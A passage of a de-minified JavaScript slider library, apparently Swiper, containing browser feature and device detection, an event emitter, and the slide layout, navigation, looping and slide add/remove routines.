        transforms3d: n.Modernizr && !0 === n.Modernizr.csstransforms3d || "webkitPerspective" in (P = s.style) || "MozPerspective" in P || "OPerspective" in P || "MsPerspective" in P || "perspective" in P,
        flexbox: function () {
            for (var e = s.style, t = "alignItems webkitAlignItems webkitBoxAlign msFlexAlign mozBoxAlign webkitFlexDirection msFlexDirection mozBoxDirection mozBoxOrient webkitBoxDirection webkitBoxOrient".split(" "), n = 0; n < t.length; n += 1) if (t[n] in e) return !0;
            return !1
        }(),
        observer: "MutationObserver" in n || "WebkitMutationObserver" in n,
        passiveListener: function () {
            var e = !1;
            try {
                var t = Object.defineProperty({}, "passive", {
                    get: function () {
                        e = !0
                    }
                });
                n.addEventListener("testPassiveListener", null, t)
            } catch (e) {
            }
            return e
        }(),
        gestures: "ongesturestart" in n
    }), c = {
        isIE: !!n.navigator.userAgent.match(/Trident/g) || !!n.navigator.userAgent.match(/MSIE/g),
        isEdge: !!n.navigator.userAgent.match(/Edge/g),
        isSafari: 0 <= (f = n.navigator.userAgent.toLowerCase()).indexOf("safari") && f.indexOf("chrome") < 0 && f.indexOf("android") < 0,
        isUiWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(n.navigator.userAgent)
    }, u = function (e) {
        var t = this;
        t.params = e = void 0 === e ? {} : e, t.eventsListeners = {}, t.params && t.params.on && Object.keys(t.params.on).forEach((function (e) {
            t.on(e, t.params.on[e])
        }))
    }, d = {components: {configurable: !0}};
    u.prototype.on = function (e, t, n) {
        var i = this;
        if ("function" != typeof t) return i;
        var r = n ? "unshift" : "push";
        return e.split(" ").forEach((function (e) {
            i.eventsListeners[e] || (i.eventsListeners[e] = []), i.eventsListeners[e][r](t)
        })), i
    }, u.prototype.once = function (e, t, n) {
        var i = this;
        return "function" != typeof t ? i : (r.f7proxy = t, i.on(e, r, n));

        function r() {
            for (var n = [], a = arguments.length; a--;) n[a] = arguments[a];
            t.apply(i, n), i.off(e, r), r.f7proxy && delete r.f7proxy
        }
    }, u.prototype.off = function (e, t) {
        var n = this;
        return n.eventsListeners && e.split(" ").forEach((function (e) {
            void 0 === t ? n.eventsListeners[e] = [] : n.eventsListeners[e] && n.eventsListeners[e].length && n.eventsListeners[e].forEach((function (i, r) {
                (i === t || i.f7proxy && i.f7proxy === t) && n.eventsListeners[e].splice(r, 1)
            }))
        })), n
    }, u.prototype.emit = function () {
        for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
        var n, i, r, a = this;
        return a.eventsListeners && (r = "string" == typeof e[0] || Array.isArray(e[0]) ? (n = e[0], i = e.slice(1, e.length), a) : (n = e[0].events, i = e[0].data, e[0].context || a), (Array.isArray(n) ? n : n.split(" ")).forEach((function (e) {
            var t;
            a.eventsListeners && a.eventsListeners[e] && (t = [], a.eventsListeners[e].forEach((function (e) {
                t.push(e)
            })), t.forEach((function (e) {
                e.apply(r, i)
            })))
        }))), a
    }, u.prototype.useModulesParams = function (e) {
        var t = this;
        t.modules && Object.keys(t.modules).forEach((function (n) {
            (n = t.modules[n]).params && o.extend(e, n.params)
        }))
    }, u.prototype.useModules = function (e) {
        void 0 === e && (e = {});
        var t = this;
        t.modules && Object.keys(t.modules).forEach((function (n) {
            var i = t.modules[n];
            n = e[n] || {};
            i.instance && Object.keys(i.instance).forEach((function (e) {
                var n = i.instance[e];
                t[e] = "function" == typeof n ? n.bind(t) : n
            })), i.on && t.on && Object.keys(i.on).forEach((function (e) {
                t.on(e, i.on[e])
            })), i.create && i.create.bind(t)(n)
        }))
    }, d.components.set = function (e) {
        this.use && this.use(e)
    }, u.installModule = function (e) {
        for (var t = [], n = arguments.length - 1; 0 < n--;) t[n] = arguments[n + 1];
        var i = this;
        i.prototype.modules || (i.prototype.modules = {});
        var r = e.name || Object.keys(i.prototype.modules).length + "_" + o.now();
        return (i.prototype.modules[r] = e).proto && Object.keys(e.proto).forEach((function (t) {
            i.prototype[t] = e.proto[t]
        })), e.static && Object.keys(e.static).forEach((function (t) {
            i[t] = e.static[t]
        })), e.install && e.install.apply(i, t), i
    }, u.use = function (e) {
        for (var t = [], n = arguments.length - 1; 0 < n--;) t[n] = arguments[n + 1];
        var i = this;
        return Array.isArray(e) ? (e.forEach((function (e) {
            return i.installModule(e)
        })), i) : i.installModule.apply(i, [e].concat(t))
    }, Object.defineProperties(u, d);
    var p, h, f, m = {
        updateSize: function () {
            var e = this, t = e.$el, n = void 0 !== e.params.width ? e.params.width : t[0].clientWidth,
                i = void 0 !== e.params.height ? e.params.height : t[0].clientHeight;
            0 === n && e.isHorizontal() || 0 === i && e.isVertical() || (n = n - parseInt(t.css("padding-left"), 10) - parseInt(t.css("padding-right"), 10), i = i - parseInt(t.css("padding-top"), 10) - parseInt(t.css("padding-bottom"), 10), o.extend(e, {
                width: n,
                height: i,
                size: e.isHorizontal() ? n : i
            }))
        }, updateSlides: function () {
            var e = this, t = e.params, i = e.$wrapperEl, r = e.size, a = e.rtlTranslate, s = e.wrongRTL,
                c = ((b = e.virtual && t.virtual.enabled) ? e.virtual : e).slides.length,
                u = i.children("." + e.params.slideClass), d = (b ? e.virtual.slides : u).length, p = [], h = [],
                f = [], m = t.slidesOffsetBefore;
            "function" == typeof m && (m = t.slidesOffsetBefore.call(e));
            var v = t.slidesOffsetAfter;
            "function" == typeof v && (v = t.slidesOffsetAfter.call(e));
            var g, y = e.snapGrid.length, b = e.snapGrid.length, x = t.spaceBetween, w = -m, S = 0, E = 0;
            if (void 0 !== r) {
                "string" == typeof x && 0 <= x.indexOf("%") && (x = parseFloat(x.replace("%", "")) / 100 * r), e.virtualSize = -x, a ? u.css({
                    marginLeft: "",
                    marginTop: ""
                }) : u.css({
                    marginRight: "",
                    marginBottom: ""
                }), 1 < t.slidesPerColumn && (g = Math.floor(d / t.slidesPerColumn) === d / e.params.slidesPerColumn ? d : Math.ceil(d / t.slidesPerColumn) * t.slidesPerColumn, "auto" !== t.slidesPerView && "row" === t.slidesPerColumnFill && (g = Math.max(g, t.slidesPerView * t.slidesPerColumn)));
                for (var C, T, k = t.slidesPerColumn, P = g / k, M = Math.floor(d / t.slidesPerColumn), L = 0; L < d; L += 1) {
                    N = 0;
                    var I, A, D, N, $, O, _, H, z, B, F = u.eq(L);
                    1 < t.slidesPerColumn && (D = A = I = void 0, "column" === t.slidesPerColumnFill ? (D = L - (A = Math.floor(L / k)) * k, (M < A || A === M && D === k - 1) && k <= (D += 1) && (D = 0, A += 1), F.css({
                        "-webkit-box-ordinal-group": I = A + D * g / k,
                        "-moz-box-ordinal-group": I,
                        "-ms-flex-order": I,
                        "-webkit-order": I,
                        order: I
                    })) : A = L - (D = Math.floor(L / P)) * P, F.css("margin-" + (e.isHorizontal() ? "top" : "left"), 0 !== D && t.spaceBetween && t.spaceBetween + "px").attr("data-swiper-column", A).attr("data-swiper-row", D)), "none" !== F.css("display") && ("auto" === t.slidesPerView ? (B = n.getComputedStyle(F[0], null), I = F[0].style.transform, A = F[0].style.webkitTransform, I && (F[0].style.transform = "none"), A && (F[0].style.webkitTransform = "none"), N = t.roundLengths ? e.isHorizontal() ? F.outerWidth(!0) : F.outerHeight(!0) : e.isHorizontal() ? ($ = parseFloat(B.getPropertyValue("width")), O = parseFloat(B.getPropertyValue("padding-left")), _ = parseFloat(B.getPropertyValue("padding-right")), H = parseFloat(B.getPropertyValue("margin-left")), z = parseFloat(B.getPropertyValue("margin-right")), (D = B.getPropertyValue("box-sizing")) && "border-box" === D ? $ + H + z : $ + O + _ + H + z) : ($ = parseFloat(B.getPropertyValue("height")), O = parseFloat(B.getPropertyValue("padding-top")), _ = parseFloat(B.getPropertyValue("padding-bottom")), H = parseFloat(B.getPropertyValue("margin-top")), z = parseFloat(B.getPropertyValue("margin-bottom")), (B = B.getPropertyValue("box-sizing")) && "border-box" === B ? $ + H + z : $ + O + _ + H + z), I && (F[0].style.transform = I), A && (F[0].style.webkitTransform = A), t.roundLengths && (N = Math.floor(N))) : (N = (r - (t.slidesPerView - 1) * x) / t.slidesPerView, t.roundLengths && (N = Math.floor(N)), u[L] && (e.isHorizontal() ? u[L].style.width = N + "px" : u[L].style.height = N + "px")), u[L] && (u[L].swiperSlideSize = N), f.push(N), t.centeredSlides ? (w = w + N / 2 + S / 2 + x, 0 === S && 0 !== L && (w = w - r / 2 - x), 0 === L && (w = w - r / 2 - x), Math.abs(w) < .001 && (w = 0), t.roundLengths && (w = Math.floor(w)), E % t.slidesPerGroup == 0 && p.push(w), h.push(w)) : (t.roundLengths && (w = Math.floor(w)), E % t.slidesPerGroup == 0 && p.push(w), h.push(w), w = w + N + x), e.virtualSize += N + x, S = N, E += 1)
                }
                if (e.virtualSize = Math.max(e.virtualSize, r) + v, a && s && ("slide" === t.effect || "coverflow" === t.effect) && i.css({width: e.virtualSize + t.spaceBetween + "px"}), l.flexbox && !t.setWrapperSize || (e.isHorizontal() ? i.css({width: e.virtualSize + t.spaceBetween + "px"}) : i.css({height: e.virtualSize + t.spaceBetween + "px"})), 1 < t.slidesPerColumn && (e.virtualSize = (N + t.spaceBetween) * g, e.virtualSize = Math.ceil(e.virtualSize / t.slidesPerColumn) - t.spaceBetween, e.isHorizontal() ? i.css({width: e.virtualSize + t.spaceBetween + "px"}) : i.css({height: e.virtualSize + t.spaceBetween + "px"}), t.centeredSlides)) {
                    for (var R = [], j = 0; j < p.length; j += 1) {
                        var q = p[j];
                        t.roundLengths && (q = Math.floor(q)), p[j] < e.virtualSize + p[0] && R.push(q)
                    }
                    p = R
                }
                if (!t.centeredSlides) {
                    R = [];
                    for (var V = 0; V < p.length; V += 1) {
                        var G = p[V];
                        t.roundLengths && (G = Math.floor(G)), p[V] <= e.virtualSize - r && R.push(G)
                    }
                    p = R, 1 < Math.floor(e.virtualSize - r) - Math.floor(p[p.length - 1]) && p.push(e.virtualSize - r)
                }
                0 === p.length && (p = [0]), 0 !== t.spaceBetween && (e.isHorizontal() ? a ? u.css({marginLeft: x + "px"}) : u.css({marginRight: x + "px"}) : u.css({marginBottom: x + "px"})), t.centerInsufficientSlides && (C = 0, f.forEach((function (e) {
                    C += e + (t.spaceBetween || 0)
                })), (C -= t.spaceBetween) < r && (T = (r - C) / 2, p.forEach((function (e, t) {
                    p[t] = e - T
                })), h.forEach((function (e, t) {
                    h[t] = e + T
                })))), o.extend(e, {
                    slides: u,
                    snapGrid: p,
                    slidesGrid: h,
                    slidesSizesGrid: f
                }), d !== c && e.emit("slidesLengthChange"), p.length !== y && (e.params.watchOverflow && e.checkOverflow(), e.emit("snapGridLengthChange")), h.length !== b && e.emit("slidesGridLengthChange"), (t.watchSlidesProgress || t.watchSlidesVisibility) && e.updateSlidesOffset()
            }
        }, updateAutoHeight: function (e) {
            var t, n, i = this, r = [], a = 0;
            if ("number" == typeof e ? i.setTransition(e) : !0 === e && i.setTransition(i.params.speed), "auto" !== i.params.slidesPerView && 1 < i.params.slidesPerView) for (t = 0; t < Math.ceil(i.params.slidesPerView); t += 1) {
                var s = i.activeIndex + t;
                if (s > i.slides.length) break;
                r.push(i.slides.eq(s)[0])
            } else r.push(i.slides.eq(i.activeIndex)[0]);
            for (t = 0; t < r.length; t += 1) void 0 !== r[t] && (a = a < (n = r[t].offsetHeight) ? n : a);
            a && i.$wrapperEl.css("height", a + "px")
        }, updateSlidesOffset: function () {
            for (var e = this.slides, t = 0; t < e.length; t += 1) e[t].swiperSlideOffset = this.isHorizontal() ? e[t].offsetLeft : e[t].offsetTop
        }, updateSlidesProgress: function (e) {
            void 0 === e && (e = this && this.translate || 0);
            var t = this, n = t.params, r = t.slides, a = t.rtlTranslate;
            if (0 !== r.length) {
                void 0 === r[0].swiperSlideOffset && t.updateSlidesOffset();
                var s = a ? e : -e;
                r.removeClass(n.slideVisibleClass), t.visibleSlidesIndexes = [], t.visibleSlides = [];
                for (var o = 0; o < r.length; o += 1) {
                    var l, c, u = r[o],
                        d = (s + (n.centeredSlides ? t.minTranslate() : 0) - u.swiperSlideOffset) / (u.swiperSlideSize + n.spaceBetween);
                    n.watchSlidesVisibility && (c = (l = -(s - u.swiperSlideOffset)) + t.slidesSizesGrid[o], (0 <= l && l < t.size || 0 < c && c <= t.size || l <= 0 && c >= t.size) && (t.visibleSlides.push(u), t.visibleSlidesIndexes.push(o), r.eq(o).addClass(n.slideVisibleClass))), u.progress = a ? -d : d
                }
                t.visibleSlides = i(t.visibleSlides)
            }
        }, updateProgress: function (e) {
            void 0 === e && (e = this && this.translate || 0);
            var t = this, n = t.params, i = t.maxTranslate() - t.minTranslate(), r = t.progress, a = t.isBeginning,
                s = a, l = t.isEnd, c = 0 == i ? a = !(r = 0) : (a = (r = (e - t.minTranslate()) / i) <= 0, 1 <= r);
            o.extend(t, {
                progress: r,
                isBeginning: a,
                isEnd: c
            }), (n.watchSlidesProgress || n.watchSlidesVisibility) && t.updateSlidesProgress(e), a && !s && t.emit("reachBeginning toEdge"), c && !l && t.emit("reachEnd toEdge"), (s && !a || l && !c) && t.emit("fromEdge"), t.emit("progress", r)
        }, updateSlidesClasses: function () {
            var e = this, t = e.slides, n = e.params, i = e.$wrapperEl, r = e.activeIndex, a = e.realIndex,
                s = e.virtual && n.virtual.enabled;
            t.removeClass(n.slideActiveClass + " " + n.slideNextClass + " " + n.slidePrevClass + " " + n.slideDuplicateActiveClass + " " + n.slideDuplicateNextClass + " " + n.slideDuplicatePrevClass), (r = s ? e.$wrapperEl.find("." + n.slideClass + '[data-swiper-slide-index="' + r + '"]') : t.eq(r)).addClass(n.slideActiveClass), n.loop && (r.hasClass(n.slideDuplicateClass) ? i.children("." + n.slideClass + ":not(." + n.slideDuplicateClass + ')[data-swiper-slide-index="' + a + '"]') : i.children("." + n.slideClass + "." + n.slideDuplicateClass + '[data-swiper-slide-index="' + a + '"]')).addClass(n.slideDuplicateActiveClass), a = r.nextAll("." + n.slideClass).eq(0).addClass(n.slideNextClass), n.loop && 0 === a.length && (a = t.eq(0)).addClass(n.slideNextClass), r = r.prevAll("." + n.slideClass).eq(0).addClass(n.slidePrevClass), n.loop && 0 === r.length && (r = t.eq(-1)).addClass(n.slidePrevClass), n.loop && ((a.hasClass(n.slideDuplicateClass) ? i.children("." + n.slideClass + ":not(." + n.slideDuplicateClass + ')[data-swiper-slide-index="' + a.attr("data-swiper-slide-index") + '"]') : i.children("." + n.slideClass + "." + n.slideDuplicateClass + '[data-swiper-slide-index="' + a.attr("data-swiper-slide-index") + '"]')).addClass(n.slideDuplicateNextClass), (r.hasClass(n.slideDuplicateClass) ? i.children("." + n.slideClass + ":not(." + n.slideDuplicateClass + ')[data-swiper-slide-index="' + r.attr("data-swiper-slide-index") + '"]') : i.children("." + n.slideClass + "." + n.slideDuplicateClass + '[data-swiper-slide-index="' + r.attr("data-swiper-slide-index") + '"]')).addClass(n.slideDuplicatePrevClass))
        }, updateActiveIndex: function (e) {
            var t = this, n = t.rtlTranslate ? t.translate : -t.translate, i = t.slidesGrid, r = t.snapGrid,
                a = t.params, s = t.activeIndex, l = t.realIndex, c = t.snapIndex, u = e;
            if (void 0 === u) {
                for (var d = 0; d < i.length; d += 1) void 0 !== i[d + 1] ? n >= i[d] && n < i[d + 1] - (i[d + 1] - i[d]) / 2 ? u = d : n >= i[d] && n < i[d + 1] && (u = d + 1) : n >= i[d] && (u = d);
                a.normalizeSlideIndex && (u < 0 || void 0 === u) && (u = 0)
            }
            (a = 0 <= r.indexOf(n) ? r.indexOf(n) : Math.floor(u / a.slidesPerGroup)) >= r.length && (a = r.length - 1), u !== s ? (r = parseInt(t.slides.eq(u).attr("data-swiper-slide-index") || u, 10), o.extend(t, {
                snapIndex: a,
                realIndex: r,
                previousIndex: s,
                activeIndex: u
            }), t.emit("activeIndexChange"), t.emit("snapIndexChange"), l !== r && t.emit("realIndexChange"), t.emit("slideChange")) : a !== c && (t.snapIndex = a, t.emit("snapIndexChange"))
        }, updateClickedSlide: function (e) {
            var t = this, n = t.params, r = i(e.target).closest("." + n.slideClass)[0], a = !1;
            if (r) for (var s = 0; s < t.slides.length; s += 1) t.slides[s] === r && (a = !0);
            if (!r || !a) return t.clickedSlide = void 0, void (t.clickedIndex = void 0);
            t.clickedSlide = r, t.virtual && t.params.virtual.enabled ? t.clickedIndex = parseInt(i(r).attr("data-swiper-slide-index"), 10) : t.clickedIndex = i(r).index(), n.slideToClickedSlide && void 0 !== t.clickedIndex && t.clickedIndex !== t.activeIndex && t.slideToClickedSlide()
        }
    }, v = {
        getTranslate: function (e) {
            void 0 === e && (e = this.isHorizontal() ? "x" : "y");
            var t = this.params, n = this.rtlTranslate, i = this.translate, r = this.$wrapperEl;
            return t.virtualTranslate ? n ? -i : i : (e = o.getTranslate(r[0], e), (e = n ? -e : e) || 0)
        }, setTranslate: function (e, t) {
            var n = this, i = n.rtlTranslate, r = n.params, a = n.$wrapperEl, s = n.progress, o = 0, c = 0;
            n.isHorizontal() ? o = i ? -e : e : c = e, r.roundLengths && (o = Math.floor(o), c = Math.floor(c)), r.virtualTranslate || (l.transforms3d ? a.transform("translate3d(" + o + "px, " + c + "px, 0px)") : a.transform("translate(" + o + "px, " + c + "px)")), n.previousTranslate = n.translate, n.translate = n.isHorizontal() ? o : c, (0 == (c = n.maxTranslate() - n.minTranslate()) ? 0 : (e - n.minTranslate()) / c) !== s && n.updateProgress(e), n.emit("setTranslate", n.translate, t)
        }, minTranslate: function () {
            return -this.snapGrid[0]
        }, maxTranslate: function () {
            return -this.snapGrid[this.snapGrid.length - 1]
        }
    }, g = {
        slideTo: function (e, t, n, i) {
            void 0 === t && (t = this.params.speed), void 0 === n && (n = !0);
            var r = this, a = e = void 0 === e ? 0 : e;
            a < 0 && (a = 0);
            var s = r.params, o = r.snapGrid, c = r.slidesGrid, u = r.previousIndex, d = r.activeIndex,
                p = r.rtlTranslate;
            if (r.animating && s.preventInteractionOnTransition) return !1;
            (e = Math.floor(a / s.slidesPerGroup)) >= o.length && (e = o.length - 1), (d || s.initialSlide || 0) === (u || 0) && n && r.emit("beforeSlideChangeStart");
            var h, f = -o[e];
            if (r.updateProgress(f), s.normalizeSlideIndex) for (var m = 0; m < c.length; m += 1) -Math.floor(100 * f) >= Math.floor(100 * c[m]) && (a = m);
            if (r.initialized && a !== d) {
                if (!r.allowSlideNext && f < r.translate && f < r.minTranslate()) return !1;
                if (!r.allowSlidePrev && f > r.translate && f > r.maxTranslate() && (d || 0) !== a) return !1
            }
            return h = d < a ? "next" : a < d ? "prev" : "reset", p && -f === r.translate || !p && f === r.translate ? (r.updateActiveIndex(a), s.autoHeight && r.updateAutoHeight(), r.updateSlidesClasses(), "slide" !== s.effect && r.setTranslate(f), "reset" != h && (r.transitionStart(n, h), r.transitionEnd(n, h)), !1) : (0 !== t && l.transition ? (r.setTransition(t), r.setTranslate(f), r.updateActiveIndex(a), r.updateSlidesClasses(), r.emit("beforeTransitionStart", t, i), r.transitionStart(n, h), r.animating || (r.animating = !0, r.onSlideToWrapperTransitionEnd || (r.onSlideToWrapperTransitionEnd = function (e) {
                r && !r.destroyed && e.target === this && (r.$wrapperEl[0].removeEventListener("transitionend", r.onSlideToWrapperTransitionEnd), r.$wrapperEl[0].removeEventListener("webkitTransitionEnd", r.onSlideToWrapperTransitionEnd), r.onSlideToWrapperTransitionEnd = null, delete r.onSlideToWrapperTransitionEnd, r.transitionEnd(n, h))
            }), r.$wrapperEl[0].addEventListener("transitionend", r.onSlideToWrapperTransitionEnd), r.$wrapperEl[0].addEventListener("webkitTransitionEnd", r.onSlideToWrapperTransitionEnd))) : (r.setTransition(0), r.setTranslate(f), r.updateActiveIndex(a), r.updateSlidesClasses(), r.emit("beforeTransitionStart", t, i), r.transitionStart(n, h), r.transitionEnd(n, h)), !0)
        }, slideToLoop: function (e, t, n, i) {
            return void 0 === t && (t = this.params.speed), e = void 0 === e ? 0 : e, this.params.loop && (e += this.loopedSlides), this.slideTo(e, t, n = void 0 === n || n, i)
        }, slideNext: function (e, t, n) {
            void 0 === e && (e = this.params.speed), void 0 === t && (t = !0);
            var i = this, r = i.params, a = i.animating;
            return r.loop ? !a && (i.loopFix(), i._clientLeft = i.$wrapperEl[0].clientLeft, i.slideTo(i.activeIndex + r.slidesPerGroup, e, t, n)) : i.slideTo(i.activeIndex + r.slidesPerGroup, e, t, n)
        }, slidePrev: function (e, t, n) {
            void 0 === e && (e = this.params.speed), void 0 === t && (t = !0);
            var i = this, r = i.params, a = i.animating, s = i.snapGrid, o = i.slidesGrid, l = i.rtlTranslate;
            if (r.loop) {
                if (a) return !1;
                i.loopFix(), i._clientLeft = i.$wrapperEl[0].clientLeft
            }

            function c(e) {
                return e < 0 ? -Math.floor(Math.abs(e)) : Math.floor(e)
            }

            var u;
            a = c(l ? i.translate : -i.translate), l = s.map(c);
            return void 0 !== (a = (o.map(c), s[l.indexOf(a)], s[l.indexOf(a) - 1])) && (u = o.indexOf(a)) < 0 && (u = i.activeIndex - 1), i.slideTo(u, e, t, n)
        }, slideReset: function (e, t, n) {
            return void 0 === e && (e = this.params.speed), this.slideTo(this.activeIndex, e, t = void 0 === t || t, n)
        }, slideToClosest: function (e, t, n) {
            void 0 === e && (e = this.params.speed), void 0 === t && (t = !0);
            var i, r, a = this, s = a.activeIndex, o = Math.floor(s / a.params.slidesPerGroup);
            return o < a.snapGrid.length - 1 && (i = a.rtlTranslate ? a.translate : -a.translate, r = a.snapGrid[o], (a.snapGrid[o + 1] - r) / 2 < i - r && (s = a.params.slidesPerGroup)), a.slideTo(s, e, t, n)
        }, slideToClickedSlide: function () {
            var e, t = this, n = t.params, r = t.$wrapperEl,
                a = "auto" === n.slidesPerView ? t.slidesPerViewDynamic() : n.slidesPerView, s = t.clickedIndex;
            n.loop ? t.animating || (e = parseInt(i(t.clickedSlide).attr("data-swiper-slide-index"), 10), n.centeredSlides ? s < t.loopedSlides - a / 2 || s > t.slides.length - t.loopedSlides + a / 2 ? (t.loopFix(), s = r.children("." + n.slideClass + '[data-swiper-slide-index="' + e + '"]:not(.' + n.slideDuplicateClass + ")").eq(0).index(), o.nextTick((function () {
                t.slideTo(s)
            }))) : t.slideTo(s) : s > t.slides.length - a ? (t.loopFix(), s = r.children("." + n.slideClass + '[data-swiper-slide-index="' + e + '"]:not(.' + n.slideDuplicateClass + ")").eq(0).index(), o.nextTick((function () {
                t.slideTo(s)
            }))) : t.slideTo(s)) : t.slideTo(s)
        }
    }, y = {
        loopCreate: function () {
            var e = this, n = e.params, r = e.$wrapperEl;
            r.children("." + n.slideClass + "." + n.slideDuplicateClass).remove();
            var a = r.children("." + n.slideClass);
            if (n.loopFillGroupWithBlank) {
                var s = n.slidesPerGroup - a.length % n.slidesPerGroup;
                if (s !== n.slidesPerGroup) {
                    for (var o = 0; o < s; o += 1) {
                        var l = i(t.createElement("div")).addClass(n.slideClass + " " + n.slideBlankClass);
                        r.append(l)
                    }
                    a = r.children("." + n.slideClass)
                }
            }
            "auto" !== n.slidesPerView || n.loopedSlides || (n.loopedSlides = a.length), e.loopedSlides = parseInt(n.loopedSlides || n.slidesPerView, 10), e.loopedSlides += n.loopAdditionalSlides, e.loopedSlides > a.length && (e.loopedSlides = a.length);
            var c = [], u = [];
            a.each((function (t, n) {
                var r = i(n);
                t < e.loopedSlides && u.push(n), t < a.length && t >= a.length - e.loopedSlides && c.push(n), r.attr("data-swiper-slide-index", t)
            }));
            for (var d = 0; d < u.length; d += 1) r.append(i(u[d].cloneNode(!0)).addClass(n.slideDuplicateClass));
            for (var p = c.length - 1; 0 <= p; --p) r.prepend(i(c[p].cloneNode(!0)).addClass(n.slideDuplicateClass))
        }, loopFix: function () {
            var e, t = this, n = t.params, i = t.activeIndex, r = t.slides, a = t.loopedSlides, s = t.allowSlidePrev,
                o = t.allowSlideNext, l = t.snapGrid, c = t.rtlTranslate;
            t.allowSlidePrev = !0, t.allowSlideNext = !0, l = -l[i] - t.getTranslate(), i < a ? (e = r.length - 3 * a + i, t.slideTo(e += a, 0, !1, !0) && 0 != l && t.setTranslate((c ? -t.translate : t.translate) - l)) : ("auto" === n.slidesPerView && 2 * a <= i || i >= r.length - a) && (e = -r.length + i + a, t.slideTo(e += a, 0, !1, !0) && 0 != l && t.setTranslate((c ? -t.translate : t.translate) - l)), t.allowSlidePrev = s, t.allowSlideNext = o
        }, loopDestroy: function () {
            var e = this.$wrapperEl, t = this.params, n = this.slides;
            e.children("." + t.slideClass + "." + t.slideDuplicateClass + ",." + t.slideClass + "." + t.slideBlankClass).remove(), n.removeAttr("data-swiper-slide-index")
        }
    }, b = {
        setGrabCursor: function (e) {
            var t;
            l.touch || !this.params.simulateTouch || this.params.watchOverflow && this.isLocked || ((t = this.el).style.cursor = "move", t.style.cursor = e ? "-webkit-grabbing" : "-webkit-grab", t.style.cursor = e ? "-moz-grabbin" : "-moz-grab", t.style.cursor = e ? "grabbing" : "grab")
        }, unsetGrabCursor: function () {
            l.touch || this.params.watchOverflow && this.isLocked || (this.el.style.cursor = "")
        }
    }, x = {
        appendSlide: function (e) {
            var t = this, n = t.$wrapperEl, i = t.params;
            if (i.loop && t.loopDestroy(), "object" == typeof e && "length" in e) for (var r = 0; r < e.length; r += 1) e[r] && n.append(e[r]); else n.append(e);
            i.loop && t.loopCreate(), i.observer && l.observer || t.update()
        }, prependSlide: function (e) {
            var t = this, n = t.params, i = t.$wrapperEl, r = t.activeIndex;
            n.loop && t.loopDestroy();
            var a = r + 1;
            if ("object" == typeof e && "length" in e) {
                for (var s = 0; s < e.length; s += 1) e[s] && i.prepend(e[s]);
                a = r + e.length
            } else i.prepend(e);
            n.loop && t.loopCreate(), n.observer && l.observer || t.update(), t.slideTo(a, 0, !1)
        }, addSlide: function (e, t) {
            var n = this, i = n.$wrapperEl, r = n.params, a = n.activeIndex;
            r.loop && (a -= n.loopedSlides, n.loopDestroy(), n.slides = i.children("." + r.slideClass));
            var s = n.slides.length;
            if (e <= 0) n.prependSlide(t); else if (s <= e) n.appendSlide(t); else {
                for (var o = e < a ? a + 1 : a, c = [], u = s - 1; e <= u; --u) {
                    var d = n.slides.eq(u);
                    d.remove(), c.unshift(d)
                }
                if ("object" == typeof t && "length" in t) {
                    for (var p = 0; p < t.length; p += 1) t[p] && i.append(t[p]);
                    o = e < a ? a + t.length : a
                } else i.append(t);
                for (var h = 0; h < c.length; h += 1) i.append(c[h]);
                r.loop && n.loopCreate(), r.observer && l.observer || n.update(), r.loop ? n.slideTo(o + n.loopedSlides, 0, !1) : n.slideTo(o, 0, !1)
            }
        }, removeSlide: function (e) {
            var t = this, n = t.params, i = t.$wrapperEl, r = t.activeIndex;
            n.loop && (r -= t.loopedSlides, t.loopDestroy(), t.slides = i.children("." + n.slideClass));
            var a, s = r;
            if ("object" == typeof e && "length" in e) {
                for (var o = 0; o < e.length; o += 1) a = e[o], t.slides[a] && t.slides.eq(a).remove(), a < s && --s;
                s = Math.max(s, 0)
            } else t.slides[a = e] && t.slides.eq(a).remove(), a < s && --s, s = Math.max(s, 0);
            n.loop && t.loopCreate(), n.observer && l.observer || t.update(), n.loop ? t.slideTo(s + t.loopedSlides, 0, !1) : t.slideTo(s, 0, !1)
        }, removeAllSlides: function () {
            for (var e = [], t = 0; t < this.slides.length; t += 1) e.push(t);
            this.removeSlide(e)
        }
    }, w = (M = n.navigator.userAgent, L = {
        ios: !1,
        android: !1,
        androidChrome: !1,
        desktop: !1,
        windows: !1,
        iphone: !1,
        ipod: !1,
        ipad: !1,
        cordova: n.cordova || n.phonegap,
        phonegap: n.cordova || n.phonegap
    }, p = M.match(/(Windows Phone);?[\s\/]+([\d.]+)?/), h = M.match(/(Android);?[\s\/]+([\d.]+)?/), P = M.match(/(iPad).*OS\s([\d_]+)/), f = M.match(/(iPod)(.*OS\s([\d_]+))?/), d = !P && M.match(/(iPhone\sOS|iOS)\s([\d_]+)/), p && (L.os = "windows", L.osVersion = p[2], L.windows = !0), h && !p && (L.os = "android", L.osVersion = h[2], L.android = !0, L.androidChrome = 0 <= M.toLowerCase().indexOf("chrome")), (P || d || f) && (L.os = "ios", L.ios = !0), d && !f && (L.osVersion = d[2].replace(/_/g, "."), L.iphone = !0), P && (L.osVersion = P[2].replace(/_/g, "."), L.ipad = !0), f && (L.osVersion = f[3] ? f[3].replace(/_/g, ".") : null, L.iphone = !0), L.ios && L.osVersion && 0 <= M.indexOf("Version/") && "10" === L.osVersion.split(".")[0] && (L.osVersion = M.toLowerCase().split("version/")[1].split(" ")[0]), L.desktop = !(L.os || L.android || L.webView), L.webView = (d || P || f) && M.match(/.*AppleWebKit(?!.*Safari)/i), L.os && "ios" === L.os && (P = L.osVersion.split("."), M = t.querySelector('meta[name="viewport"]'), L.minimalUi = !L.webView && (f || d) && (7 == +P[0] ? 1 <= +P[1] : 7 < +P[0]) && M && 0 <= M.getAttribute("content").indexOf("minimal-ui")), L.pixelRatio = n.devicePixelRatio || 1, L);

    function S() {
        var e, t, n, i = this, r = i.params, a = i.el;
        a && 0 === a.offsetWidth || (r.breakpoints && i.setBreakpoint(), e = i.allowSlideNext, t = i.allowSlidePrev, n = i.snapGrid, i.allowSlideNext = !0, i.allowSlidePrev = !0, i.updateSize(), i.updateSlides(), r.freeMode ? (a = Math.min(Math.max(i.translate, i.maxTranslate()), i.minTranslate()), i.setTranslate(a), i.updateActiveIndex(), i.updateSlidesClasses(), r.autoHeight && i.updateAutoHeight()) : (i.updateSlidesClasses(), ("auto" === r.slidesPerView || 1 < r.slidesPerView) && i.isEnd && !i.params.centeredSlides ? i.slideTo(i.slides.length - 1, 0, !1, !0) : i.slideTo(i.activeIndex, 0, !1, !0)), i.allowSlidePrev = t, i.allowSlideNext = e, i.params.watchOverflow && n !== i.snapGrid && i.checkOverflow())
    }

    var E = {
            init: !0,
            direction: "horizontal",
